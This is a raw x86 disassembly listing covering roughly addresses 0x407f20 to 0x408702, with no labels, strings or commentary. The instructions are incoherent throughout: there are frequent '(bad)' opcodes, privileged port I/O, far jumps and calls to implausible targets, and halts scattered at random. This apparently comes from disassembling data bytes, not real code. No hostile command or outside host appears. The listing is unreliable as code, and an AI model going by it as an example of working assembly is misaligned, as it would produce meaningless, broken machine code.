  407f20:	mov    ch,0xad
  407f22:	ret    
  407f23:	add    ebx,DWORD PTR [esi+eax*1+0x39]
  407f27:	push   esp
  407f28:	imul   esi,DWORD PTR [edi+0x1d29f0ff],0x50
  407f2f:	and    eax,0x5beb0c4
  407f34:	pop    ebp
  407f35:	leave  
  407f36:	jbe    0x407ee2
  407f38:	jl     0x407f5a
  407f3a:	imul   ebx,DWORD PTR [eax],0x7d
  407f3d:	test   al,0x5b
  407f3f:	in     eax,0xc1
  407f41:	and    al,0xd8
  407f43:	pusha  
  407f44:	pop    ebx
  407f45:	fs mov ebp,?
  407f48:	jl     0x407fbd
  407f4a:	out    0xc8,al
  407f4c:	and    BYTE PTR ds:0x19a8560b,al
  407f52:	retf   0x6f5f
  407f55:	fstp   QWORD PTR [edx+0x5c]
  407f58:	aad    0x32
  407f5a:	mov    esi,0x651e0391
  407f5f:	xor    DWORD PTR [eax-0x1fef8209],edx
  407f65:	dec    edx
  407f66:	jo     0x407f52
  407f68:	fsubr  QWORD PTR ds:0x8adb158f
  407f6e:	loopne 0x407f55
  407f70:	pop    edx
  407f71:	in     eax,dx
  407f72:	int3   
  407f73:	(bad)  [eax+ecx*2+0x2a]
  407f77:	mov    eax,ds:0xdecd8cb0
  407f7c:	or     eax,0xeed1cad3
  407f81:	push   ebx
  407f82:	mov    ds:0xa8342978,al
  407f87:	mov    bl,0x3d
  407f89:	mov    al,ds:0x50b7d439
  407f8e:	ss sub ah,bl
  407f91:	dec    esi
  407f92:	daa    
  407f93:	and    BYTE PTR [bx+0x5842],0xdf
  407f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f9a:	call   0x9dccb23a
  407f9f:	in     eax,0x4f
  407fa1:	inc    ebx
  407fa2:	test   BYTE PTR [ecx+0x207ba031],dl
  407fa8:	cs pop esp
  407faa:	and    BYTE PTR [eax],dl
  407fac:	dec    edi
  407fad:	das    
  407fae:	adc    BYTE PTR [eax-0x7de3b8d9],al
  407fb4:	scas   al,BYTE PTR es:[edi]
  407fb5:	or     al,0x46
  407fb7:	jecxz  0x407f3d
  407fb9:	xchg   BYTE PTR [ecx],cl
  407fbb:	aas    
  407fbc:	mov    ecx,0xf7c89ba4
  407fc1:	push   es
  407fc2:	jecxz  0x40801a
  407fc4:	xchg   ebx,eax
  407fc5:	out    dx,eax
  407fc6:	fldcw  WORD PTR [ebx+0x9]
  407fc9:	lea    ebx,[ebx]
  407fcb:	mov    dl,0xc2
  407fcd:	test   DWORD PTR [eax+0x57],esp
  407fd0:	adc    edi,ecx
  407fd2:	outs   dx,BYTE PTR ds:[esi]
  407fd3:	icebp  
  407fd4:	mov    ecx,0x2acaefe7
  407fd9:	fcom   DWORD PTR [esp+ecx*8-0x3f0729fc]
  407fe0:	gs das 
  407fe2:	xchg   edi,eax
  407fe3:	jl     0x407fd8
  407fe5:	add    esi,DWORD PTR [esi]
  407fe7:	xlat   BYTE PTR ds:[ebx]
  407fe8:	add    edx,DWORD PTR [edx+edx*8-0x18735feb]
  407fef:	pop    ds
  407ff0:	xchg   bh,dh
  407ff2:	mov    bl,0x9c
  407ff4:	adc    eax,0x562c3542
  407ff9:	or     ch,BYTE PTR ds:0x6bfe1186
  407fff:	xchg   ecx,eax
  408000:	sbb    DWORD PTR ds:0xeb534147,0x13
  408007:	bndstx [eax+0x3b],bnd1
  40800b:	clc    
  40800c:	pop    esp
  40800d:	dec    ebx
  40800e:	mov    eax,ds:0xb00194e4
  408013:	fs fmulp st(7),st
  408016:	push   ebx
  408017:	sub    edx,DWORD PTR [ecx+0x116e4c79]
  40801d:	aaa    
  40801e:	scas   al,BYTE PTR es:[edi]
  40801f:	mov    fs,WORD PTR [ebx+ebx*4+0x3d]
  408023:	xor    eax,edx
  408025:	sbb    edx,edx
  408027:	sub    eax,0xf0f9efa
  40802c:	mov    dh,0xa4
  40802e:	inc    edx
  40802f:	xor    edi,esp
  408031:	fs scas eax,DWORD PTR es:[edi]
  408033:	jne    0x408000
  408035:	push   esi
  408036:	push   ebp
  408037:	adc    eax,0x70086bdd
  40803c:	out    dx,al
  40803d:	xor    bl,BYTE PTR [esi-0x17abd27]
  408043:	mov    WORD PTR [ecx+esi*2],ds
  408046:	fsub   QWORD PTR [edx+0x17]
  408049:	(bad)  
  40804a:	cmp    bh,BYTE PTR [edx-0x37]
  40804d:	sahf   
  40804e:	lahf   
  40804f:	sahf   
  408050:	xor    al,0xf4
  408052:	(bad)  
  408053:	push   edx
  408054:	fucomp st(5)
  408056:	or     BYTE PTR [edx],cl
  408058:	xor    al,0xc
  40805a:	and    edi,DWORD PTR [esi-0x4a88de1c]
  408060:	xlat   BYTE PTR ds:[ebx]
  408061:	sbb    DWORD PTR [esp+ebp*4-0x378b40bd],ecx
  408068:	fnsave [ebx+0x1f]
  40806b:	add    eax,0x267724ae
  408070:	jg     0x4080cf
  408072:	out    dx,al
  408073:	out    0xf8,al
  408075:	sub    edi,DWORD PTR [edx+0x4f]
  408078:	fsub   st,st(0)
  40807a:	fs je  0x408010
  40807d:	sbb    al,0x4b
  40807f:	inc    edx
  408080:	test   BYTE PTR [ebx],ch
  408082:	jp     0x408099
  408084:	mov    edx,0xe3802ac8
  408089:	cwde   
  40808a:	mov    ?,eax
  40808c:	mov    eax,0x21ef57fc
  408091:	jmp    0xd39c2bbe
  408096:	push   esi
  408097:	enter  0xf156,0xdb
  40809b:	cdq    
  40809c:	pcmpeqb mm2,QWORD PTR [ecx]
  40809f:	test   BYTE PTR [edx],bh
  4080a1:	test   eax,0x4f8379e8
  4080a6:	jmp    0xef85:0xa3ea713d
  4080ad:	or     ebp,DWORD PTR ds:0x355b1ca0
  4080b3:	(bad)  [esi+0x1a]
  4080b6:	mov    dh,0xbe
  4080b8:	sar    BYTE PTR [eax+esi*1-0x7],0x93
  4080bd:	push   ds
  4080be:	inc    esi
  4080bf:	jp     0x40806b
  4080c1:	(bad)  
  4080c2:	fnstenv [ecx+0x4c]
  4080c5:	adc    BYTE PTR [ecx],bl
  4080c7:	(bad)  
  4080c9:	es ds cmp al,0x11
  4080cd:	sub    eax,0x6d8b8c58
  4080d2:	lea    eax,[edi]
  4080d4:	les    esp,FWORD PTR ds:0xbfb06c20
  4080da:	jne    0x408070
  4080dc:	pop    eax
  4080dd:	outs   dx,DWORD PTR ds:[esi]
  4080de:	fild   QWORD PTR [ecx-0x24]
  4080e1:	mov    dh,0xe0
  4080e3:	lds    esp,FWORD PTR [edx]
  4080e5:	mov    bh,0x1c
  4080e7:	sub    al,0x58
  4080e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080ea:	pop    esp
  4080eb:	jp     0x4080bb
  4080ed:	jne    0x40811e
  4080ef:	out    0x63,eax
  4080f1:	mov    DWORD PTR [edx+0x31],ebx
  4080f4:	xor    DWORD PTR [ebp+0x13b30819],eax
  4080fa:	sub    DWORD PTR [ebx],esp
  4080fc:	jbe    0x408081
  4080fe:	xchg   ebx,eax
  4080ff:	ins    DWORD PTR es:[edi],dx
  408100:	xor    eax,0xcb3ade53
  408105:	sti    
  408106:	popf   
  408107:	repnz add BYTE PTR [esi],0x2d
  40810b:	in     eax,0xb6
  40810d:	mov    bl,0x98
  40810f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408110:	fistp  WORD PTR [eax-0x5a0dffcb]
  408116:	(bad)  
  408118:	mov    al,0x16
  40811a:	or     dl,BYTE PTR [edx]
  40811c:	pop    esi
  40811d:	mov    WORD PTR [esi-0xa],ss
  408120:	dec    esi
  408121:	rcl    DWORD PTR [ebx-0x32c677bb],1
  408127:	fiadd  WORD PTR [eax-0x6820cf7c]
  40812d:	retf   
  40812e:	jno    0x4080be
  408130:	sbb    DWORD PTR [ecx+0x47661e49],edx
  408136:	pop    ebp
  408137:	mov    ch,0xa0
  408139:	(bad)  
  40813a:	jmp    0x6fe992e1
  40813f:	cmp    edi,edx
  408141:	inc    ecx
  408142:	or     ch,cl
  408144:	dec    esp
  408145:	mov    edx,0x1c518c4e
  40814a:	and    bh,0x94
  40814d:	imul   ecx,DWORD PTR ds:0xafc14aba,0x4d76b3ec
  408157:	retf   
  408158:	in     eax,0x36
  40815a:	jns    0x408123
  40815c:	mov    esi,0x63f62da1
  408161:	xchg   ebx,eax
  408162:	jne    0x4081be
  408164:	or     BYTE PTR [esi-0x58],bl
  408167:	sbb    BYTE PTR [esi-0x5f],0x97
  40816b:	rol    BYTE PTR [eax-0x2f],cl
  40816e:	cmp    ebp,DWORD PTR [esp+ecx*4]
  408171:	repz xchg ebp,eax
  408173:	cwde   
  408174:	call   0x5afcccf1
  408179:	std    
  40817a:	adc    BYTE PTR [ebp+0x54f8277b],ch
  408180:	pop    eax
  408181:	add    DWORD PTR [eax+0xc9e42d],ecx
  408187:	test   DWORD PTR [edx-0x11d62e44],edi
  40818d:	mov    ebp,0xc640e4a3
  408192:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408193:	or     BYTE PTR [edx+ebx*1-0x54c5fbc6],bh
  40819a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40819b:	outs   dx,DWORD PTR ds:[esi]
  40819c:	inc    ebp
  40819d:	push   edx
  40819e:	mov    eax,0x6b5e6f69
  4081a3:	(bad)  
  4081a4:	(bad)  
  4081a5:	push   ecx
  4081a6:	popf   
  4081a7:	std    
  4081a8:	in     eax,dx
  4081a9:	imul   edi,ecx,0xebb3a199
  4081af:	sbb    eax,0x81c43973
  4081b4:	jae    0x408223
  4081b6:	call   0xdae5:0x998239d8
  4081bd:	popf   
  4081be:	stos   BYTE PTR es:[edi],al
  4081bf:	or     eax,0x4cd56100
  4081c4:	sbb    eax,0xc7b42b73
  4081c9:	jmp    0x40823f
  4081cb:	push   edx
  4081cc:	push   ds
  4081cd:	mov    ecx,0x46e159bf
  4081d2:	aaa    
  4081d3:	lods   al,BYTE PTR ds:[esi]
  4081d4:	stos   BYTE PTR es:[edi],al
  4081d5:	push   0x7b
  4081d7:	mov    esi,0x59da44e3
  4081dc:	test   al,0x19
  4081de:	aas    
  4081df:	(bad)  
  4081e0:	pusha  
  4081e1:	hlt    
  4081e2:	das    
  4081e3:	lods   eax,DWORD PTR ds:[esi]
  4081e4:	sbb    cl,dl
  4081e6:	push   ebx
  4081e7:	stc    
  4081e8:	xor    eax,0x13005464
  4081ed:	pop    edx
  4081ee:	sbb    al,0xf2
  4081f0:	lahf   
  4081f1:	aas    
  4081f2:	pop    esi
  4081f3:	mov    al,ds:0xb357d5e7
  4081f8:	push   ss
  4081f9:	aas    
  4081fa:	pop    eax
  4081fb:	rol    DWORD PTR ds:0x558fe9b0,cl
  408201:	mov    bl,BYTE PTR [edx+0x56]
  408204:	ret    0xc237
  408207:	add    edx,ecx
  408209:	inc    edi
  40820a:	cmc    
  40820b:	das    
  40820c:	out    dx,eax
  40820d:	mov    bh,0xe4
  40820f:	scas   al,BYTE PTR es:[edi]
  408210:	cmp    ebp,ebx
  408212:	je     0x408215
  408214:	mov    edi,ecx
  408216:	fdivr  st,st(2)
  408218:	sti    
  408219:	xchg   esp,eax
  40821a:	xchg   ebx,eax
  40821b:	xchg   ebp,eax
  40821c:	push   0x31a3b8b4
  408221:	dec    ebx
  408222:	or     bh,BYTE PTR [ecx-0x35]
  408225:	sbb    DWORD PTR [ebx-0x6ef91c11],esi
  40822b:	jp     0x4081fb
  40822d:	sub    al,0xc0
  40822f:	push   ds
  408230:	sti    
  408231:	repnz aas 
  408233:	and    DWORD PTR [esi+0x2e],esp
  408236:	imul   edi,DWORD PTR ds:0xe44985bd,0xffffffbd
  40823d:	mov    ecx,0xf89914e4
  408242:	add    bh,BYTE PTR [edi-0x2d9e8b70]
  408248:	idiv   DWORD PTR [ebp+edx*1-0x537e5c25]
  40824f:	jmp    0xc211:0x66f50ce4
  408256:	xchg   esp,eax
  408257:	pop    edx
  408258:	aas    
  408259:	adc    al,BYTE PTR [edx+eiz*8-0x340956eb]
  408260:	loopne 0x408257
  408262:	pop    edx
  408263:	jecxz  0x4082ca
  408265:	or     eax,DWORD PTR [ecx-0x68]
  408268:	fisttp DWORD PTR [esi-0x7f9d3e30]
  40826e:	adc    cl,BYTE PTR [edi-0x4decf49d]
  408274:	xchg   ebx,eax
  408275:	enter  0x4758,0x78
  408279:	jae    0x408259
  40827b:	in     al,dx
  40827c:	rol    BYTE PTR [edi-0x243c00f2],1
  408282:	inc    esp
  408283:	popa   
  408284:	test   eax,0x55be397e
  408289:	in     eax,dx
  40828a:	dec    ebx
  40828b:	sti    
  40828c:	mov    al,0x0
  40828e:	arpl   di,bp
  408290:	outs   dx,BYTE PTR ds:[esi]
  408291:	sub    eax,0x1922bdea
  408296:	cmp    eax,0xf539a73c
  40829b:	jnp    0x408244
  40829d:	int    0xe3
  40829f:	pop    edx
  4082a0:	mov    cl,0xd7
  4082a2:	cmp    BYTE PTR [esi+esi*2+0x644341c5],bl
  4082a9:	mov    DWORD PTR [eax-0x73],ebx
  4082ac:	mov    eax,ds:0xa7e3b4af
  4082b1:	int3   
  4082b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082b3:	nop
  4082b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082b5:	(bad)  
  4082b6:	or     ebx,ebx
  4082b8:	jne    0x408322
  4082ba:	push   ebx
  4082bb:	jg     0x4082f2
  4082bd:	inc    edx
  4082be:	adc    bh,BYTE PTR [ecx+0x26639c2c]
  4082c4:	jno    0x4082d9
  4082c6:	mov    bh,0x20
  4082c8:	(bad)  
  4082c9:	push   eax
  4082ca:	cmc    
  4082cb:	sub    al,BYTE PTR [ebx-0x3f]
  4082ce:	add    al,0xa4
  4082d0:	and    DWORD PTR [edx+0x2f],ebx
  4082d3:	mov    ds,WORD PTR [edi-0x792c8d89]
  4082d9:	sbb    ebp,DWORD PTR [edx+ebp*4]
  4082dc:	iret   
  4082dd:	or     DWORD PTR [edi-0x72],edi
  4082e0:	into   
  4082e1:	push   ebp
  4082e2:	sbb    BYTE PTR [ebx+0x2148492b],ah
  4082e8:	cdq    
  4082e9:	mov    ecx,0xed4e0a89
  4082ee:	mov    eax,ds:0x13d9510b
  4082f3:	inc    edx
  4082f4:	jecxz  0x408295
  4082f6:	out    0xb7,al
  4082f8:	mov    dl,0x3a
  4082fa:	sahf   
  4082fb:	loop   0x408329
  4082fd:	push   edi
  4082fe:	fist   WORD PTR [ebp+0x31]
  408301:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408302:	mov    edx,0x5f3fb18a
  408307:	add    eax,edx
  408309:	inc    BYTE PTR [eax+ecx*2-0x20]
  40830d:	dec    edi
  40830e:	xor    ch,BYTE PTR [eax-0x41]
  408311:	and    eax,0x3fb38cac
  408316:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408317:	jnp    0x4082ec
  408319:	test   BYTE PTR [eax+0x1f],ch
  40831c:	pop    ds
  40831d:	test   eax,0x2eccb30d
  408322:	adc    DWORD PTR [ecx],edi
  408324:	jg     0x4082bc
  408326:	sahf   
  408327:	dec    ecx
  408328:	or     eax,0x110230c6
  40832d:	arpl   WORD PTR [ebp-0x38349d2e],si
  408333:	pop    ebp
  408334:	(bad)  
  408335:	sbb    esp,esp
  408337:	xor    dl,BYTE PTR ds:0x872cce74
  40833d:	jge    0x408396
  40833f:	sub    ch,BYTE PTR [edx]
  408341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408342:	les    ebp,FWORD PTR gs:[esi+0x3654e6a]
  408349:	jmp    0xbb37:0x94fa9618
  408350:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408351:	es dec esp
  408353:	and    al,0xfc
  408355:	retf   0x6ba2
  408358:	jecxz  0x408360
  40835a:	add    ebx,ebp
  40835c:	(bad)  
  40835d:	jbe    0x4082e0
  40835f:	xchg   edx,eax
  408360:	ror    ch,cl
  408362:	ret    
  408363:	loope  0x408340
  408365:	stos   DWORD PTR es:[edi],eax
  408366:	push   ecx
  408367:	sbb    al,0xb2
  408369:	test   al,0x59
  40836b:	cmp    BYTE PTR [edx-0x3a],ch
  40836e:	scas   eax,DWORD PTR es:[edi]
  40836f:	mov    ah,0x3a
  408371:	adc    edi,esp
  408373:	pop    ss
  408374:	jne    0x40831c
  408376:	in     al,0x10
  408378:	push   esp
  408379:	cmc    
  40837a:	xor    bh,BYTE PTR [ecx+0x7c79b43f]
  408380:	ja     0x4083fa
  408382:	or     edi,esi
  408384:	in     eax,0xd1
  408386:	fbstp  TBYTE PTR [edx+0x58]
  408389:	mov    dl,0x8c
  40838b:	shr    edx,1
  40838d:	sbb    BYTE PTR [edi+0x34cbbc8d],dl
  408393:	jnp    0x4083c8
  408395:	cdq    
  408396:	mov    dl,0x2e
  408398:	add    eax,0x991c231c
  40839d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40839e:	jo     0x408382
  4083a0:	repnz aaa 
  4083a2:	test   BYTE PTR [ebx+eax*1],bh
  4083a5:	bound  edx,QWORD PTR [ebx]
  4083a7:	xchg   ebx,eax
  4083a8:	inc    edx
  4083a9:	scas   eax,DWORD PTR es:[edi]
  4083aa:	push   ss
  4083ab:	xchg   ebx,eax
  4083ac:	push   ds
  4083ad:	xor    al,0x84
  4083af:	lahf   
  4083b0:	loop   0x4083f9
  4083b2:	ins    BYTE PTR es:[edi],dx
  4083b3:	mov    eax,0x6b518d69
  4083b8:	sar    DWORD PTR [ebp-0x4f],0x1e
  4083bc:	aam    0x40
  4083be:	mov    ebp,0xd282444a
  4083c3:	sub    esp,DWORD PTR [ebp-0x4f]
  4083c6:	pmullw mm4,QWORD PTR [ebx+edx*1]
  4083ca:	or     esi,DWORD PTR [edx-0x327bbd10]
  4083d0:	test   eax,0xd2c70c67
  4083d5:	jl     0x408364
  4083d7:	jge    0x40837a
  4083d9:	inc    esp
  4083da:	sub    DWORD PTR [esi+0x4e40123c],ebx
  4083e0:	pop    eax
  4083e1:	test   al,0x22
  4083e3:	or     BYTE PTR [ecx+0x56cfcb88],ch
  4083e9:	or     BYTE PTR ds:0x33adb8ef,ch
  4083ef:	pop    ebp
  4083f0:	arpl   WORD PTR [ecx-0x29],di
  4083f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083f4:	cmp    DWORD PTR [edx+eax*2-0x5501781f],esp
  4083fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083fc:	mov    cl,dh
  4083fe:	mov    al,0x9f
  408400:	(bad)  
  408402:	push   ecx
  408403:	rcr    DWORD PTR [ebx+0xc],cl
  408406:	mov    bl,0x36
  408408:	lea    ebp,[eax-0x3c]
  40840b:	or     ah,BYTE PTR [ebp+ebx*1-0x50]
  40840f:	push   bp
  408411:	fimul  WORD PTR [ebx]
  408413:	pop    edi
  408414:	les    edx,FWORD PTR [esi-0x20231347]
  40841a:	inc    edi
  40841b:	mov    ebx,0x264ae669
  408420:	dec    eax
  408421:	jle    0x40842a
  408423:	and    BYTE PTR [edi+0x3357845d],cl
  408429:	inc    esi
  40842a:	aas    
  40842b:	push   eax
  40842c:	push   ebp
  40842d:	jl     0x4083e2
  40842f:	push   edi
  408430:	sar    BYTE PTR [ecx+0x5d],0x66
  408434:	ins    DWORD PTR es:[edi],dx
  408435:	xchg   edi,eax
  408436:	mov    edx,0x7e6a1e8c
  40843b:	aaa    
  40843c:	retf   0xa6d7
  40843f:	cld    
  408440:	mov    ebx,0x873e8e03
  408445:	pop    esp
  408446:	lds    eax,FWORD PTR [eax-0x1459e6ff]
  40844c:	xchg   BYTE PTR [edx],bl
  40844e:	scas   al,BYTE PTR es:[edi]
  40844f:	sbb    ah,BYTE PTR [ecx-0x747bdb81]
  408455:	sbb    eax,0x25615abd
  40845a:	test   bh,ch
  40845c:	push   edi
  40845d:	out    0x40,al
  40845f:	xchg   esp,eax
  408460:	test   DWORD PTR [edx+0x136cb973],ebx
  408466:	adc    DWORD PTR [ebx],ebx
  408468:	mov    esi,0xde40f999
  40846d:	mov    eax,ds:0xe74b3b1c
  408472:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408473:	sbb    esi,DWORD PTR [edi-0x2b]
  408476:	or     ebp,DWORD PTR [edx]
  408478:	or     DWORD PTR [ecx-0x9],0x6a
  40847c:	cmp    dl,BYTE PTR [eax]
  40847e:	and    esp,DWORD PTR [esi+eax*1]
  408481:	sub    BYTE PTR [eax+0x7d],dh
  408484:	jmp    0x7bbe:0x205ad0c1
  40848b:	inc    edi
  40848c:	int3   
  40848d:	mov    dl,0x33
  40848f:	add    ebp,DWORD PTR [edi+0x3053d10f]
  408495:	out    dx,al
  408496:	int3   
  408497:	je     0x4084c2
  408499:	xor    BYTE PTR [ebp-0x1ad71d8f],cl
  40849f:	in     al,dx
  4084a0:	xchg   ebp,eax
  4084a1:	mov    ch,0x81
  4084a3:	adc    al,0xa7
  4084a5:	enter  0x8a9e,0x5e
  4084a9:	mov    ds:0x93892757,eax
  4084ae:	inc    esp
  4084af:	outs   dx,DWORD PTR ds:[esi]
  4084b0:	mov    esi,0x9fa89bab
  4084b5:	lds    ebx,FWORD PTR [edx]
  4084b7:	repz inc edi
  4084b9:	mov    cl,0x9c
  4084bb:	mul    DWORD PTR [edi]
  4084bd:	ret    
  4084be:	out    dx,eax
  4084bf:	push   ds
  4084c0:	js     0x408469
  4084c2:	cmp    DWORD PTR [eax],0xcef2f8fd
  4084c8:	aam    0xa
  4084ca:	in     al,0xb4
  4084cc:	call   0xd6cb5e34
  4084d1:	cmp    al,0x54
  4084d3:	gs xchg ecx,eax
  4084d5:	test   eax,0xe8aebfc5
  4084da:	ins    DWORD PTR es:[edi],dx
  4084db:	mov    cl,0x27
  4084dd:	outs   dx,BYTE PTR ds:[esi]
  4084de:	dec    ecx
  4084df:	fist   DWORD PTR [ecx-0x6583c839]
  4084e6:	mov    eax,eax
  4084e8:	sub    eax,0xcb62bbdd
  4084ed:	into   
  4084ee:	mov    es,WORD PTR [eax+0x3d]
  4084f1:	mov    edi,0xa545d26
  4084f6:	lods   al,BYTE PTR ds:[esi]
  4084f7:	mov    esp,0xf8eb9b25
  4084fc:	dec    ecx
  4084fd:	hlt    
  4084fe:	mov    ebp,0xa25c82ec
  408503:	mov    esi,0x4bf03787
  408508:	fnstsw WORD PTR [edx-0x4e1ba758]
  40850e:	sbb    al,0x1a
  408510:	clc    
  408511:	outs   dx,BYTE PTR ds:[esi]
  408513:	mov    al,0xc2
  408515:	mov    dh,0x2e
  408517:	push   eax
  408518:	pop    ebp
  408519:	outs   dx,BYTE PTR ds:[esi]
  40851a:	jecxz  0x4084a5
  40851c:	or     DWORD PTR es:[edi],0x4e
  408520:	stos   BYTE PTR es:[edi],al
  408521:	ret    
  408522:	fistp  QWORD PTR [ebx+edi*2+0x2a]
  408526:	jnp    0x408591
  408528:	or     DWORD PTR [edx-0x7c76ba82],0x61
  40852f:	sbb    BYTE PTR [esi-0x18],cl
  408532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408533:	mov    eax,ds:0x791c84ac
  408538:	mov    al,0xd
  40853a:	in     eax,dx
  40853b:	push   cs
  40853c:	mov    ?,WORD PTR [edi]
  40853e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40853f:	cli    
  408540:	dec    edi
  408541:	mov    eax,ds:0x7ed2f952
  408546:	outs   dx,BYTE PTR ds:[esi]
  408547:	retf   0x53e
  40854a:	cdq    
  40854b:	push   eax
  40854c:	cmp    eax,0x4051b47e
  408551:	hlt    
  408552:	cmp    cl,dh
  408554:	fmul   QWORD PTR [edx]
  408556:	fdivr  QWORD PTR [edi+0x750fbcb6]
  40855c:	test   ebp,0x284564de
  408562:	push   ss
  408563:	add    al,0xa3
  408565:	hlt    
  408566:	lock cdq 
  408568:	imul   ebp,DWORD PTR [edi],0x1
  40856b:	mov    cl,0x31
  40856d:	fwait
  40856e:	and    BYTE PTR [eax],bl
  408570:	mov    WORD PTR [ecx],ss
  408572:	aam    0xf0
  408574:	int    0xa2
  408576:	mov    al,0x2e
  408578:	repnz xchg ebp,eax
  40857a:	dec    esp
  40857b:	js     0x40854a
  40857d:	cmc    
  40857e:	inc    edx
  40857f:	(bad)
  408584:	loope  0x4085ca
  408586:	test   esp,0x983c90a9
  40858c:	pusha  
  40858d:	cmp    al,0x42
  40858f:	fsubr  QWORD PTR [esi]
  408592:	jmp    0xc263034b
  408597:	xchg   BYTE PTR [edi-0x2ba01269],ch
  40859d:	ss das 
  40859f:	call   0xf348e556
  4085a4:	sub    DWORD PTR [ebx],eax
  4085a6:	lods   ax,WORD PTR ds:[esi]
  4085a8:	test   eax,0xfe7c4e16
  4085ad:	mov    edi,esi
  4085af:	mov    edx,0x878e0ed2
  4085b4:	jp     0x40862f
  4085b6:	add    eax,0x9841515
  4085bb:	into   
  4085bc:	sbb    eax,0x63794726
  4085c1:	ss push edi
  4085c3:	sbb    al,0x5e
  4085c5:	add    dl,bh
  4085c7:	xchg   ecx,eax
  4085c8:	scas   eax,DWORD PTR es:[edi]
  4085c9:	imul   edx,DWORD PTR [esi],0x1f5e94d2
  4085cf:	enter  0x2d6c,0xbd
  4085d3:	xlat   BYTE PTR ds:[ebx]
  4085d4:	cmc    
  4085d5:	adc    BYTE PTR [ebx],bh
  4085d7:	stos   BYTE PTR es:[edi],al
  4085d8:	pop    esi
  4085d9:	mov    al,0x3b
  4085db:	xor    al,0xa8
  4085dd:	fsub   st(4),st
  4085df:	mov    al,0xec
  4085e1:	stos   BYTE PTR es:[edi],al
  4085e2:	xchg   ebx,eax
  4085e4:	add    al,0x14
  4085e6:	inc    edx
  4085e7:	shl    DWORD PTR ds:0x8147c019,1
  4085ed:	int3   
  4085ee:	popf   
  4085ef:	imul   DWORD PTR [ecx+0x5e763c83]
  4085f5:	adc    dh,0x7f
  4085f8:	mov    dl,0x76
  4085fa:	pop    eax
  4085fb:	pusha  
  4085fc:	jp     0x408597
  4085fe:	icebp  
  4085ff:	out    dx,al
  408600:	add    edi,DWORD PTR [edi+0x51b549df]
  408606:	sub    al,0xaa
  408608:	div    DWORD PTR [ebx]
  40860a:	loopne 0x408681
  40860c:	mov    ch,0x25
  40860e:	jbe    0x4085d7
  408610:	fstp   TBYTE PTR [ebx]
  408612:	pop    es
  408613:	out    0xd7,eax
  408615:	dec    eax
  408616:	rcr    DWORD PTR [edx-0x3d],cl
  408619:	mov    esi,0xfaba39ef
  40861e:	loopne 0x4085bb
  408620:	jge    0x4085b3
  408622:	shr    DWORD PTR [esi],1
  408624:	jg     0x408692
  408626:	bound  edx,QWORD PTR [ebp-0x6dade23]
  40862c:	inc    esp
  40862d:	xchg   esp,eax
  40862e:	dec    ecx
  40862f:	add    al,0x10
  408631:	sbb    al,al
  408633:	xchg   edi,eax
  408634:	push   cs
  408635:	stc    
  408636:	pop    es
  408637:	xor    al,0x79
  408639:	pop    edi
  40863a:	lock jne 0x4086b2
  40863d:	clc    
  40863e:	or     al,0xa8
  408640:	mov    WORD PTR [eax-0x46b246ef],ds
  408646:	lock lahf 
  408648:	or     BYTE PTR ds:0xfded7099,cl
  40864e:	mov    ch,0x1f
  408650:	outs   dx,DWORD PTR ds:[esi]
  408651:	push   ebx
  408652:	mov    ebp,0xf3c6dc8b
  408657:	pusha  
  408658:	(bad)  
  408659:	adc    edi,DWORD PTR [eax-0xeac09b2]
  40865f:	in     al,dx
  408660:	sar    DWORD PTR [esi-0x432b85b7],cl
  408666:	outs   dx,DWORD PTR ds:[esi]
  408667:	adc    al,0x90
  408669:	js     0x4086c3
  40866b:	bound  edi,QWORD PTR [ecx-0x54a6ad53]
  408671:	add    BYTE PTR [ebx-0x3c],cl
  408674:	je     0x408616
  408676:	xlat   BYTE PTR ds:[ebx]
  408677:	jmp    0x408694
  408679:	fnsave [ecx+0x122c19d5]
  40867f:	jg     0x4086a9
  408681:	xor    al,0x4a
  408683:	or     al,0x1
  408685:	adc    BYTE PTR [edi+eax*2-0x20e6066],ch
  40868c:	and    dh,dl
  40868e:	in     eax,dx
  40868f:	in     al,0x68
  408691:	push   ebp
  408692:	dec    ecx
  408693:	add    eax,0xa1d430d6
  408698:	sub    dl,BYTE PTR [ebp-0x34]
  40869b:	test   al,0x7e
  40869d:	add    eax,DWORD PTR [ebx+0x45]
  4086a0:	sbb    dh,dl
  4086a2:	mov    bh,0xbe
  4086a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086a5:	call   0xbea70b81
  4086aa:	jne    0x408671
  4086ac:	aad    0x8e
  4086ae:	push   eax
  4086af:	icebp  
  4086b0:	jecxz  0x408676
  4086b2:	dec    ebp
  4086b3:	pop    es
  4086b4:	stc    
  4086b5:	in     eax,dx
  4086b6:	call   0xcea67e52
  4086bb:	mov    edx,0xd8af518b
  4086c0:	xchg   BYTE PTR [esi+0x526a203e],ch
  4086c6:	jo     0x408704
  4086c8:	retf   
  4086c9:	mov    ebp,0xb45a621e
  4086ce:	(bad)  
  4086cf:	add    eax,0x7d9ae6f8
  4086d4:	addr16 and edx,0xffffffca
  4086d8:	and    eax,0x457f3128
  4086dd:	addr16 sbb eax,0x7ba3ff9c
  4086e3:	stos   DWORD PTR es:[edi],eax
  4086e4:	inc    ebx
  4086e5:	xchg   BYTE PTR [edx-0x5c],al
  4086e8:	cdq    
  4086e9:	fidivr WORD PTR [eax+0x6e]
  4086ec:	sahf   
  4086ed:	push   eax
  4086ee:	jl     0x4086bd
  4086f0:	sub    al,0x27
  4086f2:	fmul   QWORD PTR [ebp-0x4feff48b]
  4086f8:	jmp    0xf51e:0x5ec1801f
  4086ff:	sbb    esi,0x34
  408702:	push   edx
